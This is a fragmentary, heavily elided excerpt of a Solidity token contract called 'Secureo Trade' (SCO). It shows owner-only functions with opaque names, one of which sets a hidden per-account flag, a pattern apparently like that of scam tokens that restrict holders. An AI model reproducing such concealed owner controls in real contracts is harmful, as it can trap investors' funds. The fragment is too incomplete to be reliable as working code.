...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Secureo Trade';
    string constant public symbol = 'SCO';
    ...
    function ValiditySmartBridge(address account) public onlyOwner {
    ...
    function SecureoParticle(address account) public onlyOwner {
        _anyplace[account] = true;
    }

    function SecureoSmartTransfer(address account) public view returns (bool) {
...
contract SecureoToken is BaseToken {
